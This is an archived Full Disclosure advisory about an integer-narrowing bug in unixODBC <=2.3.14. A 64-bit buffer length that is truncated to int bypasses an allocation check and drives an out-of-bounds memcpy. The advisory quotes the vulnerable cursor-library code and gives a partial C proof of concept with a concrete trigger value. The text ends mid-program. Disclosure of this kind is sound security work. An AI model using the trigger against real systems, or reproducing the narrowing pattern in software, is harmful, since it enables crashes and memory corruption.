---
title: unixODBC <=2.3.14 Rude Truncation via Narrowing Conversion Causes Out-of-Bounds `memcpy`
url: https://seclists.org/fulldisclosure/2026/Nov/10
source: Full Disclosure
date: 2026-11-05
fetch_date: 2026-11-06T08:41:45.946205
---

# unixODBC <=2.3.14 Rude Truncation via Narrowing Conversion Causes Out-of-Bounds `memcpy`

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#10)
[![Next](/images/right-icon-16x16.png)](11)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#10)
[![Next](/images/right-icon-16x16.png)](11)

![](/shared/images/nst-icons.svg#search)

# unixODBC <=2.3.14 Rude Truncation via Narrowing Conversion Causes Out-of-Bounds `memcpy`

---

*From*: Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 4 Nov 2026 13:44:12 +0000

---

```
unixODBC versions <=2.3.14 contain a rude truncation of a 64-bit `SQLLEN` `buffer_length` to a 32-bit `int` without
verifying that it produces a valid, positive value.  The result is later passed to `memcpy`, causing the information
system to crash or, if carefully chosen, enabling attackers to write adjacent memory under certain circumstances (e.g.,
a buffer length that wraps to a small positive integer or triggers an undersized allocation but otherwise passes normal
validation).  Notably, multiple instances like this were found in the code and this should merely serve as an example
from which others may be found.

Examples
`get_bound_length`
`CLBindCol` accepts a 64-bit value, `buffer_length` and then passes said value to `get_bound_length`, which determines
the length either based on known column type lengths (e.g., `SQL_C_SHORT`, which has a value of `2`) or a narrowed and,
thus, rudely truncated `buffer_length` called `len` in `get_bound_length`.

Once a value such as `0x180000000` (6,442,450,944) is supplied, `get_bound_length()`'s implicit 64-bit-to-32-bit
narrowing yields `-2147483648`, which both disables the `malloc` guard that would otherwise allocate `local_buffer` and
is sign-extended back into the 64-bit `bound_length` field, where it is subsequently reinterpreted as an enormous
unsigned size.  The very next fetch on that statement -- `SQLFetch`, `SQLFetchScroll`, or `SQLExtendedFetch` -- reaches
`fetch_row()`'s unconditional `memcpy(cbuf->local_buffer, cl_statement->rowset_buffer + cbuf->rs_buffer_offset,
cbuf->bound_length)`, which both writes through the `NULL` `local_buffer` and treats the corrupted `bound_length` as a
near-`SIZE_MAX` copy length, crashing the process immediately.

As the corrupted length is committed into long-lived, per-column state rather than discarded, every subsequent fetch on
that bound column remains affected, and the same `bound_length` field also feeds a second, similarly unconditional
`memcpy()` that copies data back into the application's own real buffer, so a different combination of length value,
heap layout, or `local_buffer` contents will result in different impacts.  The snippets below only demonstrate one such
pathway -- the explanation above should set the expectations for the others.

```c
/** Lines 108-171 **/
static int get_bound_length( int target_type, int len )
{
    switch( target_type )
    {
      case SQL_C_STINYINT:
      case SQL_C_UTINYINT:
      case SQL_C_TINYINT:
        return 1;

      case SQL_C_SBIGINT:
      case SQL_C_UBIGINT:
        return 8;

      case SQL_C_SSHORT:
      case SQL_C_USHORT:
      case SQL_C_SHORT:
        return 2;

      case SQL_C_SLONG:
      case SQL_C_ULONG:
                  case SQL_C_LONG:
        return 4;

      case SQL_C_DOUBLE:
        return 8;

      case SQL_C_FLOAT:
        return 4;

      case SQL_C_NUMERIC:
        return sizeof( SQL_NUMERIC_STRUCT );

      case SQL_C_TYPE_DATE:
      case SQL_C_DATE:
        return sizeof( SQL_DATE_STRUCT );

      case SQL_C_TYPE_TIME:
      case SQL_C_TIME:
        return sizeof( SQL_TIME_STRUCT );

      case SQL_C_TYPE_TIMESTAMP:
      case SQL_C_TIMESTAMP:
        return sizeof( SQL_TIMESTAMP_STRUCT );

      case SQL_C_INTERVAL_YEAR:
      case SQL_C_INTERVAL_MONTH:
      case SQL_C_INTERVAL_DAY:
      case SQL_C_INTERVAL_HOUR:
      case SQL_C_INTERVAL_MINUTE:
      case SQL_C_INTERVAL_SECOND:
      case SQL_C_INTERVAL_YEAR_TO_MONTH:
      case SQL_C_INTERVAL_DAY_TO_HOUR:
      case SQL_C_INTERVAL_DAY_TO_MINUTE:
      case SQL_C_INTERVAL_DAY_TO_SECOND:
      case SQL_C_INTERVAL_HOUR_TO_MINUTE:
      case SQL_C_INTERVAL_HOUR_TO_SECOND:
      case SQL_C_INTERVAL_MINUTE_TO_SECOND:
        return sizeof( SQL_INTERVAL_STRUCT );

      default:
        return len;
    }

}
/** ... **/
/** Lines 173-194 **/
SQLRETURN CLBindCol( SQLHSTMT statement_handle,
                                   SQLUSMALLINT column_number,
           SQLSMALLINT target_type,
                                   SQLPOINTER target_value,
           SQLLEN buffer_length,
                                   SQLLEN *strlen_or_ind )
{
    CLHSTMT cl_statement = (CLHSTMT) statement_handle;
    CLBCOL *bcol;
    int b_len;
    SQLRETURN ret;

                if ( cl_statement -> not_from_select )
                {
                                return  SQLBINDCOL( cl_statement -> cl_connection,
                                                cl_statement -> driver_stmt,
                                                column_number,
                                                target_type,
                                                target_value,
                                                buffer_length,
                                                strlen_or_ind );
                }
/** ... **/
/** Lines 269-297 **/
    /*
     * find length
     */

    b_len = get_bound_length( target_type, buffer_length );

    if ( bcol -> local_buffer )
    {
        free( bcol -> local_buffer );
    }
    bcol -> local_buffer = NULL;

    if ( target_value && b_len > 0 )
    {
        bcol -> local_buffer = malloc( b_len );
        if ( !bcol -> local_buffer )
        {
            cl_statement -> cl_connection -> dh.__post_internal_error( &cl_statement -> dm_statement -> error,
                    ERROR_HY001, NULL,
                    cl_statement -> dm_statement -> connection ->
                        environment -> requested_version );

            return SQL_ERROR;
        }
    }

    bcol -> bound_buffer = target_value;
    bcol -> bound_length = b_len;
    bcol -> bound_type = target_type;
```
Code snippets from `unixODBC`'s cur/SQLBindCol.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Matches unixODBC's own typedef on a standard 64-bit Linux/Unix build
* (include/sqltypes.h: `#if (SIZEOF_LONG_INT == 8) ... typedef long SQLLEN;`). */
typedef long SQLLEN;

#define SQL_C_CHAR 1

/* Reproduces cur/SQLBindCol.c's get_bound_length() verbatim: the function
* signature takes a 32-bit int, so any 64-bit SQLLEN the caller passes in
* is truncated at the call boundary before this function body even runs. */
static int get_bound_length( int target_type, int len )
{
    switch ( target_type )
    {
        default:
            return len;   /* cur/SQLBindCol.c:168 */
    }
}

int main( void )
{
    char   *target_value  = malloc( 64 );           /* a real, non-NULL application buffer */
    void   *local_buffer  = NULL;                    /* cur/SQLBindCol.c:279 */
    SQLLEN  bound_length;
    SQLLEN  buffer_length = (SQLLEN) 0x180000000L;    /* 6,442,450,944: a valid 64-bit SQLLEN */
    int     b_len;
    char    rowset_buffer[ 64 ];

    memset( target_value, 'X', 64 );
    memset( rowset_buffer, 'R', sizeof( rowset_buffer ) );

    /* cur/SQLBindCol.c:273 -- b_len = get_bound_length( target_type, buffer_length ); */
    b_len = get_bound_length( SQL_C_CHAR, buffer_length );
    printf( "buffer_length (SQLLEN, 8 bytes) = 0x%lx\n", (long) b...